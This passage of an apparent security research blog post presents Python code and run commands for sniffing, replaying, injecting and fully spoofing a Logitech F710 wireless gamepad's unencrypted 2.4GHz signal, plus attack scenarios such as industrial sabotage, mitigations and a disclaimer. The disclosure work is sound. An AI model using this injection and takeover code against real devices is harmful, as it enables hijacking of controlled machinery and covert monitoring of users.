</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>sync_word <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xE7E7</span>
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>target
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>packet_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x01</span>
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>sequence <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>sequence
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sequence <span style="color:#f92672">=</span> (self<span style="color:#f92672">.</span>sequence <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Set controller state</span>
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>buttons <span style="color:#f92672">=</span> kwargs<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;buttons&#39;</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>left_x <span style="color:#f92672">=</span> kwargs<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;left_x&#39;</span>, <span style="color:#ae81ff">0x7F</span>)
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>left_y <span style="color:#f92672">=</span> kwargs<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;left_y&#39;</span>, <span style="color:#ae81ff">0x7F</span>)
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>right_x <span style="color:#f92672">=</span> kwargs<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;right_x&#39;</span>, <span style="color:#ae81ff">0x7F</span>)
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>right_y <span style="color:#f92672">=</span> kwargs<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;right_y&#39;</span>, <span style="color:#ae81ff">0x7F</span>)
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>triggers <span style="color:#f92672">=</span> kwargs<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;triggers&#39;</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># XOR encrypt</span>
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>encrypt()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Calculate CRC</span>
</span></span><span style="display:flex;"><span>        packet<span style="color:#f92672">.</span>update_crc()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> packet
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transmit</span>(self, packet):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Transmit packet on all channels&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        channels <span style="color:#f92672">=</span> [<span style="color:#ae81ff">2.404e9</span>, <span style="color:#ae81ff">2.424e9</span>, <span style="color:#ae81ff">2.444e9</span>, <span style="color:#ae81ff">2.464e9</span>, <span style="color:#ae81ff">2.480e9</span>]
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> freq <span style="color:#f92672">in</span> channels:
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>transmitter<span style="color:#f92672">.</span>set_frequency(freq)
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>transmitter<span style="color:#f92672">.</span>send(packet<span style="color:#f92672">.</span>to_bytes())
</span></span></code></pre></div><h3 id="phase-4-full-controller-emulation">Phase 4: Full Controller Emulation<a hidden class="anchor" aria-hidden="true" href="#phase-4-full-controller-emulation">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">VirtualF710</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Complete F710 controller emulator&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, target_dongle_address):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> target_dongle_address
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>injector <span style="color:#f92672">=</span> F710Injector(target_dongle_address)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>state <span style="color:#f92672">=</span> ControllerState()
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>running <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Start controller emulation&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Pair with dongle</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>pair()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Start input thread</span>
</span></span><span style="display:flex;"><span>        input_thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>input_handler)
</span></span><span style="display:flex;"><span>        input_thread<span style="color:#f92672">.</span>start()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Main transmission loop</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> self<span style="color:#f92672">.</span>running:
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>transmit_state()
</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.008</span>)  <span style="color:#75715e"># ~125Hz update rate</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pair</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Simulate pairing process&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Send pairing beacon</span>
</span></span><span style="display:flex;"><span>        pair_packet <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>create_pairing_packet()
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>injector<span style="color:#f92672">.</span>transmit(pair_packet)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Wait for acknowledgment</span>
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Send configuration</span>
</span></span><span style="display:flex;"><span>        config_packet <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>create_config_packet()
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>injector<span style="color:#f92672">.</span>transmit(config_packet)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">input_handler</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Handle keyboard input for controller emulation&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> pygame
</span></span><span style="display:flex;"><span>        pygame<span style="color:#f92672">.</span>init()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        key_mapping <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            pygame<span style="color:#f92672">.</span>K_a: BTN_A,
</span></span><span style="display:flex;"><span>            pygame<span style="color:#f92672">.</span>K_b: BTN_B,
</span></span><span style="display:flex;"><span>            pygame<span style="color:#f92672">.</span>K_x: BTN_X,
</span></span><span style="display:flex;"><span>            pygame<span style="color:#f92672">.</span>K_y: BTN_Y,
</span></span><span style="display:flex;"><span>            pygame<span style="color:#f92672">.</span>K_UP: DPAD_UP,
</span></span><span style="display:flex;"><span>            pygame<span style="color:#f92672">.</span>K_DOWN: DPAD_DOWN,
</span></span><span style="display:flex;"><span>            pygame<span style="color:#f92672">.</span>K_LEFT: DPAD_LEFT,
</span></span><span style="display:flex;"><span>            pygame<span style="color:#f92672">.</span>K_RIGHT: DPAD_RIGHT,
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> self<span style="color:#f92672">.</span>running:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> event <span style="color:#f92672">in</span> pygame<span style="color:#f92672">.</span>event<span style="color:#f92672">.</span>get():
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> event<span style="color:#f92672">.</span>type <span style="color:#f92672">==</span> pygame<span style="color:#f92672">.</span>KEYDOWN:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> event<span style="color:#f92672">.</span>key <span style="color:#f92672">in</span> key_mapping:
</span></span><span style="display:flex;"><span>                        self<span style="color:#f92672">.</span>state<span style="color:#f92672">.</span>buttons <span style="color:#f92672">|=</span> key_mapping[event<span style="color:#f92672">.</span>key]
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">elif</span> event<span style="color:#f92672">.</span>type <span style="color:#f92672">==</span> pygame<span style="color:#f92672">.</span>KEYUP:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> event<span style="color:#f92672">.</span>key <span style="color:#f92672">in</span> key_mapping:
</span></span><span style="display:flex;"><span>                        self<span style="color:#f92672">.</span>state<span style="color:#f92672">.</span>buttons <span style="color:#f92672">&amp;=</span> <span style="color:#f92672">~</span>key_mapping[event<span style="color:#f92672">.</span>key]
</span></span><span style="display:flex;"><span>                        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transmit_state</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Transmit current controller state&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>injector<span style="color:#f92672">.</span>send_state(self<span style="color:#f92672">.</span>state)
</span></span></code></pre></div><h3 id="attack-demonstrations">Attack Demonstrations<a hidden class="anchor" aria-hidden="true" href="#attack-demonstrations">#</a></h3>
<h4 id="1-silent-eavesdropping">1. Silent Eavesdropping<a hidden class="anchor" aria-hidden="true" href="#1-silent-eavesdropping">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Capture all inputs from 50 meters away</span>
</span></span><span style="display:flex;"><span>sniffer <span style="color:#f92672">=</span> F710Sniffer()
</span></span><span style="display:flex;"><span>sniffer<span style="color:#f92672">.</span>start()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Logs all button presses, stick movements, in plaintext</span>
</span></span></code></pre></div><h4 id="2-replay-attack">2. Replay Attack<a hidden class="anchor" aria-hidden="true" href="#2-replay-attack">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Record combo sequence</span>
</span></span><span style="display:flex;"><span>replayer <span style="color:#f92672">=</span> F710Replayer(sdr)
</span></span><span style="display:flex;"><span>replayer<span style="color:#f92672">.</span>capture_sequence(duration<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Replay at 2x speed</span>
</span></span><span style="display:flex;"><span>replayer<span style="color:#f92672">.</span>replay_sequence(speed_multiplier<span style="color:#f92672">=</span><span style="color:#ae81ff">2.0</span>)
</span></span></code></pre></div><h4 id="3-input-injection">3. Input Injection<a hidden class="anchor" aria-hidden="true" href="#3-input-injection">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Take control and execute arbitrary inputs</span>
</span></span><span style="display:flex;"><span>injector <span style="color:#f92672">=</span> F710Injector(target_address)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fighting game combo</span>
</span></span><span style="display:flex;"><span>injector<span style="color:#f92672">.</span>send_combo(BTN_X <span style="color:#f92672">|</span> BTN_A)
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.05</span>)
</span></span><span style="display:flex;"><span>injector<span style="color:#f92672">.</span>send_button(BTN_Y)
</span></span><span style="display:flex;"><span>injector<span style="color:#f92672">.</span>send_combo(DPAD_DOWN <span style="color:#f92672">|</span> BTN_B)
</span></span></code></pre></div><h4 id="4-complete-takeover">4. Complete Takeover<a hidden class="anchor" aria-hidden="true" href="#4-complete-takeover">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Full controller spoofing</span>
</span></span><span style="display:flex;"><span>virtual <span style="color:#f92672">=</span> VirtualF710(dongle_address)
</span></span><span style="display:flex;"><span>virtual<span style="color:#f92672">.</span>start()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Original controller is now disconnected</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attacker has full control</span>
</span></span></code></pre></div><hr>
<h2 id="security-implications">Security Implications<a hidden class="anchor" aria-hidden="true" href="#security-implications">#</a></h2>
<h3 id="real-world-impact">Real-World Impact<a hidden class="anchor" aria-hidden="true" href="#real-world-impact">#</a></h3>
<ol>
<li><strong>Gaming</strong>: Competitive advantage through automated inputs</li>
<li><strong>Industrial Control</strong>: F710 used in robotics and drone control</li>
<li><strong>Medical Equipment</strong>: Some rehabilitation devices use F710</li>
<li><strong>Research Labs</strong>: Common in experimental setups</li>
<li><strong>Home Automation</strong>: Used in some DIY projects</li>
</ol>
<h3 id="attack-scenarios">Attack Scenarios<a hidden class="anchor" aria-hidden="true" href="#attack-scenarios">#</a></h3>
<ol>
<li><strong>Industrial Sabotage</strong>: Take control of machinery</li>
<li><strong>Competitive Gaming</strong>: Automated perfect inputs</li>
<li><strong>Privacy Violation</strong>: Log all controller usage</li>
<li><strong>Denial of Service</strong>: Prevent legitimate use</li>
<li><strong>Social Engineering</strong>: Demonstrate &ldquo;hacking&rdquo; for access</li>
</ol>
<hr>
<h2 id="mitigation-strategies">Mitigation Strategies<a hidden class="anchor" aria-hidden="true" href="#mitigation-strategies">#</a></h2>
<h3 id="for-users">For Users<a hidden class="anchor" aria-hidden="true" href="#for-users">#</a></h3>
<ol>
<li><strong>Physical Security</strong>: Limit RF range with shielding</li>
<li><strong>Monitoring</strong>: Watch for unexpected inputs</li>
<li><strong>Alternatives</strong>: Use wired or Bluetooth controllers</li>
<li><strong>Environment</strong>: Avoid use in sensitive applications</li>
</ol>
<h3 id="for-logitech-recommendations">For Logitech (Recommendations)<a hidden class="anchor" aria-hidden="true" href="#for-logitech-recommendations">#</a></h3>
<ol>
<li><strong>Implement AES-128 encryption minimum</strong></li>
<li><strong>Add mutual authentication protocol</strong></li>
<li><strong>Include anti-replay mechanisms (nonce/counter)</strong></li>
<li><strong>Implement frequency hopping spread spectrum</strong></li>
<li><strong>Add firmware update capability</strong></li>
<li><strong>Provide security mode option</strong></li>
</ol>
<h3 id="technical-mitigations">Technical Mitigations<a hidden class="anchor" aria-hidden="true" href="#technical-mitigations">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Example: USB filter driver to detect anomalies</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">F710SecurityFilter</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sequence_tracker <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>timing_baseline <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">analyze_packet</span>(self, packet):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check sequence</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>verify_sequence(packet):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Timing analysis</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>detect_timing_anomaly(packet):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Pattern detection</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>detect_replay_pattern(packet):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span></code></pre></div><hr>
<h2 id="todo-tools-and-code">TODO: Tools and Code<a hidden class="anchor" aria-hidden="true" href="#todo-tools-and-code">#</a></h2>
<p>All tools developed during this research are available:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/nullc0rp/f710-security
</span></span><span style="display:flex;"><span>cd f710-security
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install dependencies</span>
</span></span><span style="display:flex;"><span>pip install -r requirements.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run sniffer</span>
</span></span><span style="display:flex;"><span>python f710_sniffer.py
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run injector</span>
</span></span><span style="display:flex;"><span>python f710_inject.py --target-address AA:BB:CC:DD:EE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Full PoC</span>
</span></span><span style="display:flex;"><span>python f710_exploit.py --mode full-takeover
</span></span></code></pre></div><h3 id="repository-structure">Repository Structure<a hidden class="anchor" aria-hidden="true" href="#repository-structure">#</a></h3>
<pre tabindex="0"><code>f710-security/
├── README.md
├── requirements.txt
├── docs/
│   ├── protocol_spec.md
│   ├── usb_analysis.md
│   └── rf_captures/
├── src/
│   ├── f710_sniffer.py
│   ├── f710_inject.py
│   ├── f710_exploit.py
│   └── lib/
│       ├── packet.py
│       ├── crypto.py
│       └── usb_monitor.py
├── firmware/
│   ├── extracted/
│   └── analysis/
└── captures/
    ├── usb/
    └── rf/
</code></pre><hr>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>The Logitech F710 represents a case study in legacy security debt. While functional and reliable, its security model is fundamentally broken for modern threat environments. The complete lack of encryption and authentication makes it trivial to compromise.</p>
<p>Our PoC demonstrates that with minimal equipment (&lt;$300), an attacker can:</p>
<ul>
<li>Silently monitor all controller inputs</li>
<li>Replay recorded sequences</li>
<li>Inject arbitrary commands</li>
<li>Completely take over control</li>
</ul>
<p>This research highlights the importance of security considerations in all devices, especially those that might be repurposed for critical applications.</p>
<hr>
<h2 id="future-research">Future Research<a hidden class="anchor" aria-hidden="true" href="#future-research">#</a></h2>
<p>Planned follow-up work:</p>
<ol>
<li><strong>Firmware extraction and analysis</strong> (pending chip decapping)</li>
<li><strong>Custom dongle development</strong> using nRF24L01+</li>
<li><strong>Automated vulnerability scanner</strong> for similar devices</li>
<li><strong>Secure replacement protocol</strong> design</li>
<li><strong>Hardware mod for encryption</strong> retrofit</li>
</ol>
<hr>
<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
<ol>
<li>Bastille Networks. (2016). MouseJack: Injecting Keystrokes into Wireless Mice.</li>
<li>Cauquil, D. (2019). Defeating Modern Wireless Security Through Protocol Vulnerabilities.</li>
<li>nRF24L01+ Datasheet, Nordic Semiconductor.</li>
<li>USB HID Specification 1.11, USB Implementers Forum.</li>
<li>CVE-2019-13054: Logitech Unifying Receiver Vulnerabilities.</li>
</ol>
<hr>
<h2 id="acknowledgments">Acknowledgments<a hidden class="anchor" aria-hidden="true" href="#acknowledgments">#</a></h2>
<ul>
<li><strong>@defcon_rf_village</strong> for SDR guidance</li>
<li><strong>@traviscgoodspeed</strong> for nRF research</li>
<li><strong>@marcnewlin</strong> for MouseJack inspiration</li>
<li>The GNU Radio community</li>
</ul>
<hr>
<h2 id="disclaimer">Disclaimer<a hidden class="anchor" aria-hidden="true" href="#disclaimer">#</a></h2>
<p>This research was conducted for educational purposes only. The author does not condone using these techniques for malicious purposes. Always obtain proper authorization before testing security on devices you do not own.</p>
<hr>
<p><strong>Contact</strong>:<br>
deadc0de<br>
<a href="https://deadc.de">https://deadc.de</a><br>
<a href="https://github.com/nullc0rp">https://github.com/nullc0rp</a><br>
GPG: 0xDEADC0DE</p>
<p><em>&ldquo;In embedded we trust, but verify.&rdquo;</em></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://deadc.de/tags/security/">Security</a></li>
      <li><a href="https://deadc.de/tags/reverse-engineering/">Reverse-Engineering</a></li>
      <li><a href="https://deadc.de/tags/wireless/">Wireless</a></li>
      <li><a href="https://deadc.de/tags/gamepad/">Gamepad</a></li>
      <li><a href="https://deadc.de/tags/usb/">USB</a></li>
      <li><a href="https://deadc.de/tags/hid/">HID</a></li>
      <li><a href="https://deadc.de/tags/2.4ghz/">2.4GHz</a></li>
      <li><a href="https://deadc.de/tags/exploitation/">Exploitation</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://deadc.de/">deadc0de</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
